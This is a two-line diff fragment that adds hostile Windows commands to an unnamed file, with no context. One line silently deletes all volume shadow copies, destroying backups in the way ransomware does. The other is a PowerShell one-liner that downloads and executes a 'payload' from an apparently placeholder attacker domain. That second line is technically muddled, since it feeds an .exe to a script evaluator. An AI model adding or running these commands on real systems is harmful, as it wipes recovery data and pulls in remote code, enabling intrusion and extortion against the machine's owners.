@@ -1,0 +1,2 @@
+vssadmin.exe delete shadows /all /quiet
+IEX (New-Object Net.WebClient).DownloadString('http://badguy-command.xyz/payload.exe')
